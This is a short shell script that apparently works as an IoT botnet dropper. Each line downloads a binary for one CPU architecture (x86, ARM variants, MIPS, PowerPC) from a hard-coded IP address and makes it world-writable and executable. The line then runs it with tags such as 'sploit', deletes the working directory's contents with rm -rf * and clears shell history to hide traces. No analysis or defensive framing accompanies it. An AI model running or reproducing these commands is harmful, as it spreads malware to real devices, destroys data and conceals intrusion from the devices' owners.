#!/bin/sh

wget http://107.182.129.226/uwu/x86 -O woah; chmod 777 *;./woah adb;rm -rf *;history -w;history -c
wget http://107.182.129.226/uwu/arm -O woah; chmod 777 *;./woah sploit;rm -rf *;history -w;history -c
wget http://107.182.129.226/uwu/arm5 -O woah; chmod 777 *;./woah sploit;rm -rf *;history -w;history -c
wget http://107.182.129.226/uwu/arm6 -O woah; chmod 777 *;./woah sploit;rm -rf *;history -w;history -c
wget http://107.182.129.226/uwu/arm7 -O woah; chmod 777 *;./woah sploit;rm -rf *;history -w;history -c
wget http://107.182.129.226/uwu/mips -O woah; chmod 777 *;./woah sploit;rm -rf *;history -w;history -c
wget http://107.182.129.226/uwu/mpsl -O woah; chmod 777 *;./woah sploit;rm -rf *;history -w;history -c
wget http://107.182.129.226/uwu/ppc -O woah; chmod 777 *;./woah sploit;rm -rf *;history -w;history -c
wget http://107.182.129.226/uwu/x86 -O woah; chmod 777 *;./woah sploit;rm -rf *;history -w;history -c






